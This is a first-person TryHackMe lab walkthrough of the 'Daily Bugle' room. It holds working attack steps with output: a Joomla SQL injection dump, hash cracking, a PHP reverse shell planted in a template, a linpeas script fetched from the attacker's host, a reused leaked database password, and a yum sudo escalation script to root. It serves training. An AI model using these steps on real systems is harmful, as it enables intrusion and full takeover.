## Room Information

Platform: **<a href="https://tryhackme.com" target="blank">TryHackMe</a>**

Room Name: **<a href="https://tryhackme.com/room/dailybugle" target="blank">Daily Bugle</a>**

Difficulty: [**Hard**]

Date Completed: [**13/03/2026**]

## Objective

- Active Reconnaissance
- Web Enumeration and Exploitation
- Privilege Escalation

## Summary

Compromise a Joomla CMS account via SQLi, crack password hashes and escalate privileges by taking advantage of yum(binary).

## Tools Used
- Rustscan/Nmap
- Gobuster/Dirsearch
- Whatweb
- Hydra
- Netcat

## Reconnaissance

### Summary

I use the Rustscan tool to know which ports are open and which service they are running and their versions.

**Scan for open ports:**
```
❯ sudo nmap 10.113.184.136 -n -sV -sC -p22,80,3306
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-16 14:39 +0200
Nmap scan report for 10.113.184.136
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-title: Home
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.43 seconds

```
- Analysing the scan results from nmap, I see that the machine is hosting a website on port 80. Visiting the website I see an article titled **Spider-Man robs bank!**.  

![Web Page](screenshots/dailybugle_webpage_screenshot.png)

## Directory and Version Enumeration

### Summary
I used gobuster tool to enumerate the website's directories, used whatweb tool to enumerate the version of the **CMS (Content Management System)** software and identified a vulnerability that can be used against the **CMS** login page.


**Enumerating directories:**

```
❯ gobuster dir -u http://10.113.184.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 124 --ne
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.113.184.136
[+] Method:                  GET
[+] Threads:                 124
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
modules              (Status: 301) [Size: 238] [--> http://10.113.184.136/modules/]
images               (Status: 301) [Size: 237] [--> http://10.113.184.136/images/]
media                (Status: 301) [Size: 236] [--> http://10.113.184.136/media/]
bin                  (Status: 301) [Size: 234] [--> http://10.113.184.136/bin/]
plugins              (Status: 301) [Size: 238] [--> http://10.113.184.136/plugins/]
templates            (Status: 301) [Size: 240] [--> http://10.113.184.136/templates/]
includes             (Status: 301) [Size: 239] [--> http://10.113.184.136/includes/]
language             (Status: 301) [Size: 239] [--> http://10.113.184.136/language/]
components           (Status: 301) [Size: 241] [--> http://10.113.184.136/components/]
cache                (Status: 301) [Size: 236] [--> http://10.113.184.136/cache/]
libraries            (Status: 301) [Size: 240] [--> http://10.113.184.136/libraries/]
tmp                  (Status: 301) [Size: 234] [--> http://10.113.184.136/tmp/]
layouts              (Status: 301) [Size: 238] [--> http://10.113.184.136/layouts/]
administrator        (Status: 301) [Size: 244] [--> http://10.113.184.136/administrator/]
cli                  (Status: 301) [Size: 234] [--> http://10.113.184.136/cli/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

- Looking at the results the directory enumeration, there is a few interesting directories. Starting with `/administrator`, I see that a **Joomla** login webpage is hosted. I try to gain access by attempting default credentials like **admin:admin**, but it doesn't work, so I try to gather information about the webpage and version using whatweb to know if I can exploit the login page. 

```
❯ whatweb -a 3 http://10.113.184.136/administrator/
http://10.113.184.136/administrator/ [200 OK] Apache[2.4.6], Bootstrap, Cookies[2b01af51830ca9615359108de04d9ca1], Country[RESERVED][ZZ], HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.6.40], HttpOnly[2b01af51830ca9615359108de04d9ca1], IP[10.113.184.136], JQuery, Joomla[3.7.0][com_users], probably Mambo[com_users], MetaGenerator[Joomla! - Open Source Content Management], PHP[5.6.40], PasswordField[passwd], Script[application/json], Title[The Daily Bugle - Administration], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.6.40], X-UA-Compatible[IE=edge]

```

- The **Joomla** version is **3.7.0**, this version is vulnerable to SQL Injection. And instead of using SQLMAP, I'll use a python script **<a href="https://github.com/gloliveira1701/Joomblah/blob/main/joomblah.py" target="blank">Joomblah.py</a>** to enumerate the database for any credentials so I can login into the **Joomla Login Page**.


## Web Exploitation And Password Cracking

### Summary

I used a Python script to exploit an SQL injection vulnerability in the **Joomla** login page to enumerate the database, resulting in retrieving a password hash from the database. I then used **hashid** to identify the hash type and **John the Ripper** to crack it using a known wordlist.

**Executing python script:**

```
❯ python3 joomlah.py http://10.113.184.136

  |   |   '   _    \     '   _    \                            .---.
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session


```
- After executing the python script against the target machine I found a table in the **database** named `fb9j5_users` and after extracting users from the table, a user's information was returned, their `Permission, Username, Email and Password Hash`. I will try to crack the **Hash** using a tool. Fist I start by saving the hash inside a file named (`jonah.hash`), then use **Hashid** to identify the hash and crack it using **JohnTheRipper**.

```
❯ hashid -m jonah.hash
--File 'jonah.hash'--
Analyzing '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
--End of file 'jonah.hash'--%  

```
 Now that I know what kind of hash it is, I used **John the Ripper** to crack the hash with a known wordlist (`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt jonah_hash.txt`). After getting the cracked password, I attempted to login into the **Joomla login page** and as expected I got access!


## Compromising Target Machine
### Summary

After obtaining administrator credentials, I leveraged Joomla’s template editing feature to achieve **RCE (Remote Code Execution)** and establishing a **Reverse shell** on the target machine as apache user.

From here on I did some research and I found that if an attacker managed to get admin credentials **which I did**, you can get **RCE** (Remote Code Execution) by adding a snippet of **PHP code** to an already existing **PHP file** to gain **RCE**. When can do this by **customizing** a **template**. For more information, visit: **<a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-web/joomla.html?highlight=joomla#joomla">Joomla - HackTricks</a>**. I instead leveraged **RCE** to get a **Reverse Shell**.

- First, I **click** on **`Templates`** on the bottom left under **`Configuration`** to pull up the templates menu.
- Then, **Click** on a **template name**. I choose **`protostar`** under the **`Template`** column header. This will bring us to the **`Templates: Customise`** page.
- Finally, you can click on a page to pull up the **page source**. Let’s choose the **`error.php`** page. I’ll add the Pentestmonkey's reverse shell to gain code execution:
**<a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="blank">Pentestmonkey's Reverse Shell</a>**. I change the **$ip** variable in the **PHP script** to my **TryHackMe vpn ip address**, and then **Save & Close**.

Before executing the payload, I start a Netcat listener on my machine with the command **`rlwrap nc -lvnp 1234`**. Then to execute our payload so that the target machine initiates a reverse shell with my listener, I load the url **`http://10.113.184.136/templates/protostar/error.php`** where my payload is, and the target machine executes the payload.

```
❯ rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [<my vpn ip address>] from (UNKNOWN) [10.113.184.136] 55236
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 11:37:07 up  3:23,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
sh-4.2$ 

```






## Privilege Escalation
### Summary

Achieved privilege escalation by using linpeas on the compromised machine from apache user to an official user on the target machine then escalated privileges further by using the **yum** binary.

I'll use the **<a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS" target="blank">Linpeas Script</a>** to find any vulnerabilities or misconfigurations that I can use to escalate privileges. So I'll start a simple server on my machine where I am hosting a **linpeas script** and fetch it from the reverse shell of the compromised machine.

My machine:
```
❯ linpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
├── linpeas_darwin_amd64
├── linpeas_darwin_arm64
├── linpeas_fat.sh
├── linpeas_linux_386
├── linpeas_linux_amd64
├── linpeas_linux_arm
├── linpeas_linux_arm64
├── linpeas.sh
└── linpeas_small.sh
❯ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```
Compromised machine:
```
sh-4.2$ cd tmp
cd tmp
sh-4.2$ wget http://<my vpn ip address>:8000/linpeas.sh
wget http://<my vpn ip address>:8000/linpeas.sh
--2026-03-16 11:54:40--  http://<my vpn ip address>:8000/linpeas.sh
Connecting to <my vpn ip address>:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 989760 (967K) [application/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  5% 49.9K 18s
    50K .......... .......... .......... .......... .......... 10%  102K 13s
   100K .......... .......... .......... .......... .......... 15%  187K 10s
   150K .......... .......... .......... .......... .......... 20%  156K 8s
   200K .......... .......... .......... .......... .......... 25%  140K 7s
   250K .......... .......... .......... .......... .......... 31% 1.19M 6s
   300K .......... .......... .......... .......... .......... 36%  287K 5s
   350K .......... .......... .......... .......... .......... 41% 3.65M 4s
   400K .......... .......... .......... .......... .......... 46%  141K 3s
   450K .......... .......... .......... .......... .......... 51% 2.91M 3s
   500K .......... .......... .......... .......... .......... 56%  405M 2s
   550K .......... .......... .......... .......... .......... 62% 1.95M 2s
   600K .......... .......... .......... .......... .......... 67%  127K 2s
   650K .......... .......... .......... .......... .......... 72%  179K 1s
   700K .......... .......... .......... .......... .......... 77%  461M 1s
   750K .......... .......... .......... .......... .......... 82%  429M 1s
   800K .......... .......... .......... .......... .......... 87%  472M 1s
   850K .......... .......... .......... .......... .......... 93%  413M 0s
   900K .......... .......... .......... .......... .......... 98%  170K 0s
   950K .......... ......                                     100% 30.7M=4.0s

2026-03-16 11:54:45 (240 KB/s) - 'linpeas.sh' saved [989760/989760]

sh-4.2$ ls
ls
linpeas.sh
sh-4.2$ chmod +x linpeas.sh
chmod +x linpeas.sh
sh-4.2$ ls -lah
ls -lah
total 968K
drwxrwxrwt   2 root   root     24 Mar 16 11:54 .
dr-xr-xr-x. 17 root   root    244 Dec 14  2019 ..
-rwxrwxrwx   1 apache apache 967K Feb 25 20:11 linpeas.sh
sh-4.2$ ./linpeas.sh
./linpeas.sh
...
╔══════════╣ Searching passwords in config PHP files
/var/www/html/configuration.php:        public $password = 'nv5uz9r3ZEDzVjNu';                                      
/var/www/html/libraries/joomla/log/logger/database.php:                 $this->password = (empty($this->options['db_pass'])) ? '' : $this->options['db_pass'];                                                                          
/var/www/html/libraries/joomla/log/logger/database.php:                 $this->password = null;
/var/www/html/libraries/joomla/log/logger/database.php:                 'password' => $this->password,

```
I'll **SSH(Secure Shell)** into the machine using the credential I found from executing the **linpeas** script on the compromised machine.

```
❯ ssh jjameson@10.113.184.136
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
jjameson@10.113.184.136's password: 
Last login: Mon Dec 16 05:14:55 2019 from netwars
[jjameson@dailybugle ~]$ whoami
jjameson
[jjameson@dailybugle ~]$ id
uid=1000(jjameson) gid=1000(jjameson) groups=1000(jjameson)
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
...
[jjameson@dailybugle ~]$ 

```

Now to escalate privileges to **Root**, I'll take advantage of the fact that this user has permission to use a binary called yum. 

```
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[jjameson@dailybugle ~]$ 

```


Doing some research I found that this binary can be exploited on **<a href="https://gtfobins.org/gtfobins/yum/" target="blank">GTFOBins</a>** using this script:

```
❯ cat exploitforyum.txt
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

```

When I copy and paste this script on the reverse shell of the compromised machine, I get a root shell:

```
[jjameson@dailybugle ~]$ TF=$(mktemp -d)
[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[jjameson@dailybugle ~]$ 
[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
sh-4.2# ls /root
anaconda-ks.cfg  root.txt
sh-4.2# cat /root/root.txt
...
sh-4.2# 
 
```

